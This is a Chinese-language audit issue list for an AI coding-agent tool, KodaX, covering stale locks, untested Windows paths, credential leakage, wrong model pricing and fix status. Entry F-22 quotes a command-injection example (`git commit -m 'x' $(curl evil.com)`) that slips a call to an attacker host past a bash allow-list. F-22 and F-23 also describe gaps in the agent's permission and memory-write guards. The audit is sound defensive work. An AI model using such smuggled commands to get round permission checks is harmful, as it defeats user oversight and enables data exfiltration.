# KodaX v0.7.97 问题清单

基线：分支 `KodaX`，HEAD `866d1bdb8`，版本 `0.7.97-alpha.11`。来源是 2026-11-01 的全链路审计（`docs/REVIEW_v0.7.97_FULL_CHAIN_AUDIT.md`），按严重度排列。

复核：同日对照第一批修复（`2ee4a782d`、`68a02521c`，Issue 376）复核了一遍，参考了 GPT 的逐项复核。每条下面的"状态"说明修复情况；修复本身带来的新问题在下一节。条目的原文保留基线时的描述，被证明不准的地方在"状态"里更正。

标记：**VERIFIED** 已在源码确认并给出行号；**SUSPECTED** 推理成立但未复现。

## 状态总览

- 已修复：F-02、F-10、F-11、F-17、F-22、F-23。
- 新创建的锁已修好，修复前留下的锁仍然卡住：F-05、F-06、F-07，见 F-45。
- 部分修复：F-03、F-08、F-09、F-12。
- 判断有误，撤回或改写：F-28 撤回；F-11（OpenAI 一半）、F-21b、F-37、F-39、F-41、F-43 各有子项撤回；F-02、F-09、F-29、F-33、F-38 的描述有更正；F-13、F-14、F-20、F-21 补充了修复时要区分的情况。
- 这批没有涉及、仍然未修复：F-13 至 F-16、F-18 至 F-21a、F-24 至 F-27、F-29 至 F-43（F-28 已撤回），以及 F-04 除端口断言以外的部分。
- 新增：F-44、F-45、F-46，都是这批修复带来的。

## 第一批修复带来的新问题

### F-44 · `config.json` 解析失败时，`--version`、`--help`、`doctor` 也无法运行 · VERIFIED（P1）
`packages/repl/src/common/utils.ts:1147` 把原来"解析失败回退默认值"改成直接抛错，这个错误在命令分发之前抛出。用临时 `KODAX_HOME` 对当前构建实测：`config.json` 为空、截断，或只多一个尾逗号（`{"provider":"anthropic",}`）时，`kodax --version` 退出码 1，`--help`、`doctor`、`doctor --help`、`config --help` 都只输出 "Core configuration is unreadable or invalid: …config.json. Repair the retained original before continuing."，不给解析错误的位置。回归指南 `ISSUE_376_v0.7.97_REGRESSION_GUIDE.md:13` 声明拒绝范围是 CLI/SDK 执行和配置写入，实际范围比这大。手改配置多一个逗号很常见，修复前的版本写 `config.json` 也不是原子操作，可能已经在用户机器上留下截断的文件；这些用户升级后连自检命令都跑不起来。

### F-45 · 修复前留下的锁、无法读出所有者的锁，仍然没有恢复路径，也没有诊断 · VERIFIED（P1）
新的写法（先写临时文件再 `link` 发布）只保证以后不再产生坏锁。已经存在的锁：
- 配置写锁：旧代码用 `openSync('wx')` 创建，锁文件一定是空的。`core-config-lock.ts:93` 的 `reclaim` 解析失败就返回 `false`，`core-config-lock.test.ts:105-107` 明确把空锁定为永久冲突。报错（`:17`）只给 `config.json` 的路径，说 "lock is busy or its ownership cannot be safely recovered"，不给锁文件路径。集成配置的 `.lock` 走同一个函数，情况相同。
- owner 协调锁：半写的 `owner-policy.lock` 仍然解析不了（`state.ts:508-523` 返回 `undefined`），用户只看到 "Runtime owner transition is already in progress."（`:257,272,329,390`）。F-06 原来的症状对已有文件没有变化。
- 会话迁移锁：`session-migration.ts:264` 的 `lockIsStale` 删了 5 分钟心跳过期，读不出 owner 时不再视为废弃。进程在 `mkdir` 与写 `owner.json` 之间被杀，锁目录永远在；旧 owner 的 PID 被别的进程复用时，锁在那个进程退出之前一直在。`ensureLayoutMigrated`（`:547`）拿不到锁时静默返回；`storage.ts:794-831` 只要看到 `.migration-lock` 就对每次稳定读抛 `data_changed`。这条路径上 F-07 的症状比修复前更难恢复。文件头 `:11-12` 的注释还在描述已经删掉的心跳回收。
- OAuth 会话锁：`oauth-session-store.ts:38-51` 只在能读出 `owner.json` 且确认进程已退出时回收。旧版本留下的锁目录里没有 `owner.json`，每次空转 30 秒后报 `storage_failed`。
- 配置写锁和迁移锁的存活判断只用 `process.kill(pid, 0)`，没有用 `state.ts` 已有的进程启动身份；Windows 上 PID 复用会让死锁看起来还活着。
- 回收用的 tombstone 文件（`*.reclaim.<hash>`）从不清理。回收者在发布 claim 之后、删除锁之前崩溃，这一代锁永远无法再回收。回归指南第 15 行说这种情况会被诊断，这几处代码都没有发出诊断。

不按 TTL 强行回收是有意的选择，见文末"刻意选择"。缺的是：用户无从知道卡住的是哪个文件、什么条件下手动删除是安全的，`kodax doctor` 也不检查这些锁。

### F-46 · 改了 `exit_plan_mode` 描述和 plan 模式拒绝文案，没有配套 eval · VERIFIED（P2）
`packages/coding/src/prompts/static-text.json:72` 与 `packages/coding/src/tools/managed-tool-text.ts:40` 新增 "Wait for Host approval before implementing"；`packages/repl/src/permission/executor.ts:50` 的拒绝文案整句重写。这增加了行为约束，不属于 `benchmark/EVAL_GUIDELINES.md:250` 说的同义改写；按 CLAUDE.md，工具 `description` 改动需要新增或更新 eval，这批提交没有改动任何 eval 文件。

## P0

### F-02 · 约 150 个 Windows 专属用例从不在 CI 执行 · VERIFIED
Windows job（`ci.yml:352-366`）只跑显式列出的文件和 `-t` 过滤。不在列表里的 `runIf(win32)` 用例包括 `managed-child-processes.cache.test.ts`（Issue 371）、`sandbox-runtime.test.ts:2178-4827`（Issue 372 的 TS 一半，约 75 例）、`permission-analyzer.test.ts` 的 16 处路径别名护栏，以及凭据与 ACL 权限测试。回退 `managed-child-processes.ts:1186` 或弄坏别名识别，Linux 跳过、Windows job 不加载、发布全绿。

**状态：已修复（`2ee4a782d`）。** `scripts/windows-test-files.mjs` 按文件内容发现平台相关用例，新的 `windows-source` job（`ci.yml:292-313`）分 portable/system 两档跑 149 个文件，没有新增触发事件。更正：精确数量受 `.each` 和运行时分支影响，"约 150"只是估计；"发布全绿"说过头了，`test:bundle` 里的 `bundled-startup-recovery.test.mjs` 已在 Windows CI 和 release 中覆盖 Issue 371 的一部分。这个 job 和新加的 Windows Memory 门禁（`ci.yml:405-409`）还没在 GitHub 上跑过，按现在的触发规则，第一次运行在下次打 tag 时。

### F-05 · 核心配置写锁没有所有者和 TTL · VERIFIED
`packages/repl/src/common/core-config-lock.ts:25-46` 用 `openSync(lockPath,'wx')` 建 `config.json.write.lock`，`finally` 里 `rmSync`；锁文件不记录 pid 和时间。进程在 `action()` 期间被杀，或 `rmSync` 被杀软占用失败，锁残留，之后每次写配置都抛 `CoreConfigWriteConflictError`，没有回收路径，`kodax doctor` 也不检测。

**状态：新建的锁已修复（`2ee4a782d`）。** 锁记录带 version/pid/nonce，先写临时文件再 `link` 发布，写失败会清理，`config.json` 改为原子写入。修复前留下的空锁仍然永久冲突，`doctor` 仍不检测，见 F-45。

### F-06 · owner 协调锁半写入后永久无法回收 · VERIFIED
`src/runtime-daemon/state.ts:459-488` 先 `openSync('wx')` 再 `writeFileSync`+`fsyncSync`。两步之间崩溃或写失败（如 ENOSPC）留下空文件或半截 JSON，抛错路径不删自己创建的文件。回收函数 `:490-503` 依赖 `readRuntimeOwnerCoordinationHandle`（`:505-520`），解析失败返回 `undefined`，回收与获取都失败。`daemon stop --force`（`src/kodax_cli.ts:1557-1627`）第一步就要这把锁，拿不到报 `unverified_owner`，对无法解析的 `daemon.lock` 也拒绝删除。

**状态：新写入已修复（`2ee4a782d`）。** owner 记录完整写入并 fsync 后才发布，写失败不再留下空锁；每一代锁只允许一次回收。修复前留下的半写文件仍然解析不了，`--force` 仍然没有可执行的清理路径，见 F-45。拒绝删除身份不明的锁这一点本身是对的。

## P1

### F-03 · Issue 345 没有可运行的测试 · VERIFIED
唯一防线是 `packages/repl/src/ui/utils/transcript-input-policy.ts:126` 的 `!options.isBrowsingHistory`；没有测试文件提到 `isBrowsingHistory`，只有不运行的 `tests/repl-pty-acceptance.mjs` 覆盖，而没有任何 workflow 运行该脚本。回退修复，CI 照样通过。Issue 350、352 部分相同。

**状态：部分修复。** `transcript-input-policy.test.ts` 新增了 offset 0/4 与是否浏览历史的参数表，策略层的回退现在会失败。`tests/repl-pty-acceptance.mjs` 仍然没有任何脚本或 workflow 运行，按键到屏幕的关键动作层没有覆盖。

### F-07 · 迁移残留让会话读取永久报 `data_changed` · VERIFIED
`packages/repl/src/interactive/session-migration.ts:484` 删除迁移日志时 `.catch(() => undefined)`，`releaseLock`（`:295-296`）删除 `.migration-lock` 同样吞错，此时完成标记已写。之后 `ensureLayoutMigrated`（`:496-500`）看到标记直接返回，不再清理；`storage.ts:794-831` 只要看到 `.migration-journal.jsonl` 或 `.migration-lock` 就抛 `SessionReadError('data_changed')`（17 处调用点）。Windows 上杀软或索引器占用导致删除失败很常见。

**状态：收尾清理已修复（`2ee4a782d`）。** 删除日志和锁失败时有限重试并抛错；`ensureLayoutMigrated` 在已迁移但有残留时会重新清理。同一提交删掉了心跳过期，读不出 owner 的锁不再回收，带来了新的永久卡住路径，见 F-45。

### F-08 · 执行事实文件损坏会让该会话每个 Provider 请求失败 · VERIFIED
`src/execution-facts.ts:18-26` 的 `load` 解析失败或版本不符直接抛错；`provider()`（`:107`）经 `change()` 调用它，作为观察者注册在 `src/sdk-runtime.ts:5708,9591,11615`，在 `packages/llm/src/provider-request-observation.ts:71`（`try` 之前）同步调用，整条链没有 catch。`save`（`:27-33`）写临时文件后重命名但不 fsync。`change()` 每次整文件重写，长会话写入成本随请求数线性增长（SUSPECTED）。

**状态：部分修复。** 坏文件不再阻断 Provider 请求，读写失败发一次诊断并把覆盖率标为 partial，未知执行不会被当成"未执行"（`execution-facts.ts`）。整文件重写没有改。GPT 在同一台机器上实测 50/250/1000 次请求分别约 0.5/2.9/13.6 秒（回归指南:38-46），增长比线性快。

### F-09 · 其他同类锁与损坏文件 · SUSPECTED
OAuth 会话存储 mkdir 锁无所有者无 TTL 且跨 DPAPI 调用持有（`oauth-session-store.ts:12-22,53-70`）；启动身份缺失时存活判断退化为 PID 并缓存 `undefined`（`state.ts:96-103,685-710`、`store-lock.ts`）；集成配置锁（`integration-config.ts:577-588`）；一个损坏的待处理输入文件阻塞整个 profile（`sdk-runtime.ts:17002-17015`）；`config.json` 写入非原子而 `writeCoreConfigAtomically` 未使用（`utils.ts:270-334`）；扩展存储解析失败当空（`session-lineage/persistence.ts:215-262`）；`runtime-agent-store.ts:77-112`、`a2a/task-store.ts:261-311` 最后一行写坏导致历史整体不可读；`.product-host` 启动锁与 owner 锁有与 F-06 相同的窗口（`state.ts:823-854,882-919`）。

**状态：部分修复（`2ee4a782d`）。** 已修：`config.json` 原子写入；集成配置锁并入 F-05 的新锁；单个损坏的待处理输入文件只阻塞它所在的会话（`sdk-runtime.ts`）；扩展存储遇到坏行不再当空覆盖；Agent 事件账本读失败只隔离那一个任务（`executor-plane.ts:601-609`）；OAuth 会话锁有了 owner；`.product-host` 与 owner 锁共用 F-06 的新发布方式。仍在：
- `runtime-agent-store.ts:186-189` 用 `appendFileSync` 追加事件，`readEvents`（`:89-105`）遇到任何坏行都抛错。末行写到一半时崩溃，该任务就被永久隔离，没有区分"末尾半行"和"中间损坏"。扩展存储（`session-lineage/persistence.ts:224-229`）同样不区分。
- `src/a2a/task-store.ts` 没有改动。
- 启动身份缺失时退化为 PID 判断（`state.ts`、`store-lock.ts`）没有改动。
- 更正：`writeCoreConfigAtomically` 在别处已有使用，原文"未使用"只指 `config.json` 这条路径。

### F-10 · 一个凭据源失败会让所有 Provider 永久不可用 · VERIFIED
`src/kodax_cli.ts:4637-4640` 用 `cliCredentials ??= createCliProviderCredentials(config)` 缓存 promise，reject 后每次授权都拿到同一个 rejected promise，直到进程重启。`src/cli-provider-credentials.ts:1-45` 在 `store.initialize()` 后串行对每个 OAuth 自定义 Provider 执行迁移和 `openOAuthSession`，没有按来源隔离。测试只覆盖 unlinked（`cli-provider-credentials.test.ts:36`）。

**状态：已修复（`2ee4a782d`）。** `createCliProviderCredentialAccess` 在失败后清掉 pending promise，可以重试；OAuth 来源改为用到时才打开，一个来源失败不影响其他来源。

### F-11 · 原生 Anthropic 客户端继承环境里的 token 与代理地址 · VERIFIED
f2cb876bf 只修了 compat 路径（`packages/llm/src/providers/anthropic.ts:304`）。原生路径 `registry.ts:201` 只传 `apiKey`；`createAnthropicSdkClient`（`anthropic.ts:66-71`）原样展开 options，不默认 `authToken: null`，也不固定 `baseURL`，SDK 会读 `ANTHROPIC_AUTH_TOKEN` 和 `ANTHROPIC_BASE_URL`。在设置了这两个变量的终端（Claude Code、编辑器）里启动 KodaX，保存的 key 会连同继承的 Bearer token 发往继承的代理地址。SUSPECTED：OpenAI SDK 同样读取 `OPENAI_BASE_URL`、`OPENAI_ORG_ID`、`OPENAI_PROJECT_ID`。

**状态：已修复（`2ee4a782d`）。** `registry.ts:201` 传 `authToken: null`，`baseURL` 取 `getBaseUrl()`（显式配置、`ANTHROPIC_BASE_URL`、官方地址依次回退，`anthropic.ts:293`）。OpenAI 一半撤回：broker 路径显式把 org/project 置为 `null`（`openai.ts:460`），endpoint 进入连接指纹，不是同一个问题。

### F-13 · 默认模型和部分路由没有费率，整个会话成本显示为未知 · VERIFIED
`getCostRate`（`packages/llm/src/cost-rates.ts:219-229`）只做精确匹配，没有回退；`cost-tracker.ts:182,209` 只要有一次调用没有费率，整个会话 `totalCost` 就是 `null`。缺失的有 `openai` 的默认模型 `gpt-5.3-codex`（能力表:132）、`kimi` 与 `kimi-code` 的 `k3.1-pro` 与 `k3.1-pro-highspeed`、`zhipu` 的 `glm-5.2`。默认配置下的 OpenAI 会话永远不显示成本。

**状态：未修复。** 补充：未知费率返回 `null`、只做精确匹配，这本身是正确的契约（`SDK_MIGRATION.md:364`）；缺的是核实过的费率数据，不应用相近模型、订阅名义价或 0 代替。官方资料：`gpt-5.3-codex` 为 1.75/14、缓存 0.175，400K/128K，已标 deprecated，计划 2027-04-01 关停；Kimi API 的 `kimi-k3.1-pro*` 与 Coding Plan 的 `k3.1-pro*` 是不同的 ID 和计费方式，人民币价格不能直接当美元填。

### F-14 · 价格与上下文上限和官方不符 · VERIFIED
官方值按 Anthropic 当前模型表和 OpenAI 价格页核对（2026-11-01）：

| 模型 | 代码里现在 | 官方 |
|---|---|---|
| `claude-sonnet-4-6`、`claude-opus-4-6` | 无模型级上限，继承 200K / 64K（能力表:124-125） | 1M / 128K；压缩阈值 75%（`session-lineage/compaction/policy.ts:3`）现在约 150K 触发，而不是约 750K |
| `claude-haiku-4-5` | 0.80 / 4.00，缓存读 0.08，写 1.00（`cost-rates.ts:52-58`） | 1.00 / 5.00，缓存读 0.10，写 1.25；`cost-rates.test.ts:120` 钉住了旧值 |
| `claude-sonnet-4-6` 缓存读 | 0.375（`cost-rates.ts:48-49`） | 0.30 |
| `gpt-5.4` | 30 / 120（`cost-rates.ts:61`）；OpenAI 全部 400K / 32,768（能力表:157-158） | 2.50 / 15.00，缓存输入 0.25；1.05M / 128K |
| Claude 5 系列（Opus 5.5、Sonnet 5.5、Haiku 5.5） | 能力表、费率表都没有 | 1M 上下文；未收录时按 200K 预算、成本未知 |

Opus 4.7、4.8 的能力与价格是对的。

**状态：未修复。** 补充：输出的硬上限（`packages/llm/src/types.ts:646` 的 `outputTokenLimit`）和默认请求预算（`providers/base.ts:327-346`）是两回事，表里的 128K 指前者，默认输出不应随之调到 128K。上下文从 200K 改到 1M 会改变压缩时点。Claude 5.5 还有常开的 adaptive thinking、thinking block 绑定等协议差异，Haiku 5.5 按输入长度分档计价，只补元数据不等于完成接入。

### F-15 · Skill 的 `haiku`、`opus` 别名指向已退役模型 · VERIFIED
`packages/coding/src/skill-invocation-policy.ts:316-325` 与 `packages/repl/src/interactive/invocation-runtime.ts:187-203` 各有一份映射：`haiku` → `claude-3-5-haiku-latest`（2026-02-19 退役），`opus` → `claude-opus-4-1`（2026-08-05 退役）。两者都不在能力表和费率表里；从 Claude Code 生态导入的 Skill 常写这两个别名。

### F-21 · spill 出来的工具输出不再有任何生产清理 · VERIFIED
alpha.10 时唯一的生产调用在 `packages/repl/src/session/public-api.ts:302`，84922d76d 删除了它。`maybeRunReferenceAwareToolOutputGc`、`maybeRunToolOutputGc`（`packages/coding/src/tools/tool-output-gc.ts:179,207`）只剩 barrel 导出；`docs/features/v0.7.40.md:423` 说供 Host 显式调用，而 Host 不调用。长期运行的 Host 或 SDK 用户，每个大输出与恢复清单永久留在 `~/.kodax/tool-results`（`truncate.ts:254`），磁盘无界增长。

**状态：未修复。** 澄清：84922d76d 撤掉启动时的全量扫描是有意的，多个 SDK sessionsDir 与进程共享这些输出，按 TTL 盲删会删掉别处仍在引用的原件；这里不是建议恢复它。问题在于撤掉之后没有任何按引用判断的清理替代它。

### F-22 · bash 允许列表在没有 extractor 时退回可注入的 `startsWith` 匹配 · VERIFIED
`packages/coding/src/permissions/permission.ts:939` 的 `isToolCallAllowed` 在调用方没传 `BashPrefixExtractor` 时走 `matchesBashPatternLegacy`（`:871`、`:997-1003`），注释自己承认 `git commit -m "x" $(curl evil.com)` 会匹配 `git commit:*`，并计划 0.8 移除。KodaX 自己的 REPL 都传 extractor，但 `isToolCallAllowed` 经 `index.ts:1297` 的 `export *` 公开，`createPermissionContext`（`permission/index.ts:48`）的 extractor 参数可选，不传就落到这条路径。

**状态：已修复（`2ee4a782d`）。** 没有 extractor 时，只有不含 shell 元字符、没有重定向、按 token 精确匹配前缀的单条命令能自动放行，其余走确认流程（`permission.ts` 的 `matchesBashPatternWithoutExtractor`）。

### F-24 · `kodaxRuntimeContracts` 没有读者且已漂移 · VERIFIED
根 `package.json:11-20`。`src/`、`packages/*/src`、`scripts/`、`tests/`、`.github/` 里读者为 0，自 v0.7.78（`2f61969e4`）加入后从未被读过。内容与 `KODAX_RUNTIME_SDK_CAPABILITIES`（`src/sdk-runtime.ts:1008-1023`）不一致：它有 `integrationConfigResilience`，后者没有；后者有 `runtimeEventCoalescing`、`sandboxRuntime`、`conversationHistory`，它没有。升版本时不会有人发现不同步。

### F-25 · 能力版本号手抄 5-7 处，没有跨副本一致性测试 · VERIFIED
`runtimeAutoModeGuardrail: 6` 出现在 `src/runtime-daemon/server.ts:2755`、`src/sdk-runtime.ts:4399,1018,4208,6067,1094` 与 `package.json`；`sandboxRuntime: 11` 出现在 `src/sandbox-runtime.ts:443`、`sdk-runtime.ts:1019,4218,6069`；子字段如 `retryClassifierTimeoutMs: 180_000`（`server.ts:2764`、`sdk-runtime.ts:4408`）没有绑定 `DEFAULT_CLASSIFIER_RETRY_TIMEOUT_MS`（`packages/coding/src/guardrails/auto-mode/classify.ts:130`）。每份副本各自用字面量测试钉住（`server.test.ts:2182`、`sdk-runtime.test.ts:334`），副本之间无人比较：只升 daemon 广告会继续接受旧 daemon，只升需求副本会让所有 daemon 被 `daemon_capability_upgrade_required` 拒绝。

### F-26 · 已退役的 `runtimeExitSettlement:2` 仍被描述为现行能力 · VERIFIED
02631b4f5 删除了该能力与 `settleKodaXRuntimeExit`，但 `docs/ADR.md`（3 处）、`README.md`（3 处）、`docs/PRD.md`、`docs/release.md` 多个版本块，以及自我知识 `manual-topics.json`（3 处）仍把它列为现行下限。`packages/coding/src/self-knowledge/registry.test.ts:115,139,343` 钉住了这段过期文本。模型被问到时会说这个能力存在；嵌入方照文档写 `requirements` 会类型检查失败。

### F-27 · 测试专用 helper 随公共 SDK 发布 · VERIFIED
SDK 入口用 `export *` 再导出，以下符号进入了公共子路径：根与 `/coding` 的 `_resetRuntimeForTesting`（`packages/coding/src/index.ts:1260`）；`/agent` 的 `_resetMessageQueueForTests`、`_resetActiveRootQueueRoutesForTests`（`packages/agent/src/index.ts:509-510`）、`_resetPresetDispatchers`（`:227`）、`_resetInvariantRegistry`（`:312`）、`_resetAdmittedAgentBindings`（`:335`）、`_resetAdmissionMetrics`（`:340`）、`resetSkillRegistry`、`_getRegisteredProcessors`、`createMcpTestServerFixture`；`/repl` 的 `_resetQueuedPromptsCacheForTests`、`resetTmuxControlModeProbeForTesting`。嵌入方调用其中任一 reset，会清空活着的 Runtime 的进程级注册表或消息队列。

## P2

### F-04 · 从不运行的测试与环境门 · VERIFIED
`tests/bundled-artifacts.test.mjs`、`tests/repl-fixture-daemon.test.mjs` 没有被任何脚本或 workflow 引用；`KODAX_ARTIFACT_TEST_BROWSER` 从不设置，`browser-formats.test.ts:10-73`、`pdf-render.test.ts:21`、`render.test.ts:9` 全部跳过；`tests/sa-refactor-goldens/selection.test.ts:263-266` 依赖真实 `~/.kodax/sessions`，CI 中永远跳过。`tests/asrt-wfp-probe.test.mjs:81` 仍断言端口数精确相等，vitest 侧已在 11e1ce086 放宽。

**状态：端口断言已在 `19aa6a3c3` 修复，其余未改动。** `selection.test.ts` 在没有真实 `~/.kodax/sessions` 时跳过是合理的 opt-in，CI 不应去读真实用户历史；缺的是有没有合成语料覆盖同样的逻辑。

### F-12 · 其他凭据链风险 · SUSPECTED
CLI 与 daemon 环境不同导致连接指纹漂移，报 "Provider credential connection is not approved"（`provider-credential-authorizer.ts:76`）；OAuth 与云 token 刷新轮换 replay 身份，Vertex 上同一 run 的工具调用按文本重放导致 Google 缓存失效（`credential-fingerprint.ts:3-5`、`cloud-auth.ts:12-15`、`google-messages.ts:30,39-49`）；Anthropic OAuth 的 thinking signature 是空串（`anthropic.ts:1661-1672`）；sealed OAuth 备份带着过期 refresh token（`provider-oauth-store.ts:34-39`）；alpha.11 忽略 `auth.json`，自定义 Provider 用 google/bedrock/mistral/pi-messages 协议时启动即报 "Unknown protocol"，`auth-file.ts:46-66` 校验严格、未知字段直接拒绝；刷新 token 与落盘之间崩溃需重新登录；401 不触发强制刷新；配额错误仍可触发子进程 fallback。
已确认健全、不用动的：重试上限 ≤3、非幂等请求不重试、`redirect: 'error'`、头注入拦截、日志脱敏、跨进程 OAuth 刷新串行化、`auth.json` 原子 CAS 写入。

**状态：只修了 thinking signature 一项（`2ee4a782d`）。** 自定义 Provider 用 `oauth: 'anthropic'` 时强制 `strictThinkingSignature`（`custom-provider.ts:529`）。其余子项没有代码改动：CLI 与 Host 环境不同导致的指纹漂移、token 轮换后 replay 身份变化、sealed 备份带过期 refresh token（`provider-oauth-store.ts` 未改）、alpha.11 不认识的协议、401 不强制刷新、配额错误触发 fallback。"刷新与落盘之间崩溃需重新登录"这一条，服务端已消费 refresh token 而本地没落盘时，只靠本地代码无法保证无感恢复。真实 OAuth 与云认证还没有实测。

### F-16 · 手册对 DeepSeek 的描述与代码矛盾 · VERIFIED
`manual-topics.json:244-249` 说默认模型是 `deepseek-v4-flash`、两条 V4 路由都只支持文本、Flash 费率 0.14/0.28、Pro 0.435/0.87。代码：默认 `deepseek-flash`（能力表:163）、`image-input-native`（:198）、Flash 0.14/0.56（`cost-rates.ts:76`）、Pro 0.63/1.89（`:78`）。手册:1875-1877 是对的，同一文件前后矛盾。用户问"能看图吗""多少钱"时，模型会答错。

### F-17 · 提示词让模型调用不存在的工具 `set_permission_mode` · VERIFIED
`packages/repl/src/permission/executor.ts:50` 在计划模式拦截写操作时告诉模型确认后调用 `set_permission_mode`，该工具已被移除（`tool-execution-context.ts:20,191`），现行路径是 `exit_plan_mode`。另外 `exit_plan_mode` 的两份描述（`static-text.json:72`、`managed-tool-text.ts:40`）写着"不要与 `set_permission_mode` 合用"却没有原因（ADR-033 第 3 条）。这是 alpha.10 之前就有的问题。

**状态：已修复（`2ee4a782d`），缺 eval，见 F-46。** 拒绝文案改为指向 `exit_plan_mode`，两份描述都去掉了 `set_permission_mode`。

### F-18 · SA 的 system 提示在会话第 2 次请求时改变 · 机制 VERIFIED，缓存代价 SUSPECTED
`run-substrate.ts:1673-1680` 每轮重建 system；`per-turn-reasoning.ts:84` 用 `messages.length === 1` 判定 `isNewSession`，git-context 与 project-snapshot（`capability-sections.ts:156-178`）只在首请求出现，之后后续各节整体前移。repo-intelligence 一节（`capability-sections.ts:180-188`）按 cwd 缓存预取 60 秒（`middleware/repo-intelligence.ts:70`），review/bugfix/edit/refactor 任务会带改动范围（同文件:234-238），过期后若文件或行数统计变化，其后的 AGENTS.md、Skills 各节一起失效。AMA 有意保持 system 前缀稳定（`runner-driven.ts:1868-1891`）。尚未用 `probe:prompt-cache` 测量实际损失。

### F-20 · 同一模型在不同路由上的元数据不一致 · VERIFIED
K3.1 Pro 输出上限 `kimi` 131,072 / `kimi-code` 32,000 / `ark-coding` 128,000，K3 有对齐测试（`model-capabilities.test.ts:103-111`）而 K3.1 没有；`MiniMax-M3` 在 `minimax-coding` 是 `native-adaptive`、`ark-coding` 继承 `native-toggle`；`deepseek-v4-pro` 在 `deepseek` 是 `native-effort`、`ark-coding` 是 `native-toggle`；Codex CLI 桥类自建配置（`codex-cli.ts:13-22`）写 `prompt-only`、128K，与能力表的 `codex-cli-effort` 不一致（运行时以哪份为准 SUSPECTED）；预设与内置别名的 key 变量不同（`provider-presets.ts:27,40` 对能力表:385,591）；`cost-rates.ts:5` 注释写 11 个 Provider，实际 16 个。

**状态：未修复。** 补充：基础 API、Coding Plan、第三方网关、CLI 桥对同一模型的限额和 reasoning 协议可能本来就不同，"不一致"不能直接判为 bug；要按路由核实，同义数据才统一，不能为了数值对齐让网关收到它不支持的参数。

### F-21a · Skill 的两处未公告行为变化 · 一条 VERIFIED 一条 SUSPECTED
显式工具调用带策略的 Skill 现在失败：`runToolInvocation` 经 `packages/coding/src/host-invocation.ts:51` 只复制 `options.context.activateModelSkill`，而该函数只由 `applyRuntimeSkillInvocationPolicy` 安装；`src/sdk-runtime.ts:11370`、`src/client-runtime-adapter.ts:197-200` 直接调用它，得到 `[Tool Error] skill x: runtime Skill activation is unavailable.`（`packages/coding/src/tools/skill.ts:87`）。可达性 SUSPECTED，fail-closed 但未公告。
**状态：未修复。** GPT 已用现有构建离线复现：普通 Skill 成功，只加了 `allowed-tools` 的 Skill 报 activation unavailable；可达性升为 VERIFIED。独立 Host/ProductClient 组合还没跑。
`skill` 工具豁免 allowed-tools 是有意放宽（`skill-invocation-policy.ts:549` 的 `tool !== 'skill'`）：Skill A 声明 `allowed-tools: Read` 后，模型仍可加载 Skill B，B 的 hooks 与 `model` 覆盖进入本次 run；B 的具体工具调用仍受 A 检查。

### F-21b · alpha.10 以来的其他行为变化，大多没有测试
- 请求 effort 与实际发送不同且没有 fallback 记录时不再提示（`src/session-view-notices.ts:25-27`，VERIFIED）。
- 配置文件里的 `agentMode: "sa"` 被静默改成 AMA，命令行 `--agent-mode sa` 会报错（`src/cli_option_helpers.ts:293-304`，VERIFIED）。
- daemon 拒绝客户端发送的 `timeout`，旧客户端收到 `invalid_input`（`src/runtime-daemon/client.ts:457`，VERIFIED）。
- 工具派发先过 `isToolDiscoverable`，历史里调用未激活工具的模型得到 "Tool is not active in the current runtime."（`tool-dispatch.ts:218`，VERIFIED，fail-closed）。
- executor 注册指纹从 `serialize` 改为 `JSON.stringify`，Map/Set 序列化成 `{}`（`executor-plane.ts:398-401`，VERIFIED，仅当注册含非 JSON 值）。
- win32 上不在 Job 中时每条 bash 多启动一个 node gate 进程；被信号杀死的目标报退出码 1（`windows-managed-process.ts`、`bash.ts:1006`，SUSPECTED）。
- run 被 fence 或进入终态后外部 `onEffectiveConfig` 回调被抑制（`src/sdk-runtime.ts`，SUSPECTED）。
- win32 上没有启动身份的 managed-child 记录永远无法确认，改为隔离而非清扫，会累积（`managed-child-processes.ts`，SUSPECTED）。
- Issue 353 应保持 Open：守卫在 `run-manager.ts:397`，但没有测试断言已完成 run 的投影，脚本结束后的短窗口内状态仍可能显示 running（SUSPECTED）。

**状态：多数是有意的边界，不需要回退。** effort 提示保持安静（`9e3147da4`、`306eafdfa`）、配置里旧 SA 模式的归一化、工具派发 fail-closed、run 被 fence 后抑制旧的配置回调、无法确认身份的子进程改为隔离，都是有意设计。Map/Set 一条撤回：`executor-plane.ts:123-129` 已拒绝非 plain JSON 对象，这个反例在公开入口上不可达。仍需处理的：旧客户端发 `timeout` 时要得到能看懂的错误；win32 额外 gate 进程与退出码需要实测；隔离记录要有有界的维护；Issue 353 的投影需要定向验证。

### F-23 · shell 写 memory 的拦截已移除，沙箱又不保护 memory 目录 · VERIFIED
fbbe3ca8c 从 bash 工具删除了 `shellMemoryMutationDenial` 调用，改由沙箱承担；但 `memory-scopes` 不在 `WORKSPACE_SHELL_INTERNAL_AGENT_HOME_DIRECTORIES`（`src/sandbox-runtime.ts:531-536`），也不在 `PROTECTED_DIRECTORIES`（`packages/coding/src/permissions/agent-home-policy.ts:7-12`）。文件工具仍调用 `memoryMutationDenial`，shell 不调用：工作区是用户主目录或授权了 agent home 写入时，shell 可以改写 memory。`shellMemoryMutationDenial`（`tools/memory-mutation-guard.ts:9`）现在只有测试调用。

**状态：已修复（`2ee4a782d`）。** `memory-scopes` 和已存在的旧版 Memory 目录加入了沙箱写保护；bash 直接写 Memory 的目标由 `getGovernedMemoryShellWriteDenial`（`bash.ts:585-586`）拒绝。Full Access 下任意程序不在 OS 隔离之内，这是 ADR-069 的既定边界。Windows 上真实 Memory 门禁本机前置条件不满足，还没有实际验收。`shellMemoryMutationDenial` 仍然没有生产调用。

### F-28 · 版本用 `===` 精确匹配，会拒绝更新的 Host · 撤回
**状态：撤回。** 没有当前兼容故障的证据。有些能力版本是 schema 或语义版本，没有向后兼容的保证，直接放宽成 `>=` 可能接受不兼容的协议。下面保留原文，供定义各能力的兼容规则时参考。

`src/client-runtime-adapter.ts:26,47` 要求 `productExecutionProfile.version === 2`，未来的 v3 Host 会被报 `daemon_upgrade_required`；daemon 只在 `=== 1` 时透传 owner 能力（`server.ts:2711-2729`，涵盖 `productClient`、`sessionDrafts`、`productExitControl`）。支持 `>=` 的 `assertVersionedRuntimeCapability`（`sdk-runtime.ts:5887`）存在但没有使用。

### F-29 · 现有测试发现不了大部分公共 API 的意外变化 · VERIFIED
**状态：未修复。** 更正：已有 product consumer、dts 与 public entrypoint 检查，原标题"没有测试"说过头了，是覆盖不全。被引用的类型没有单独命名导出，不等于完全无法使用。
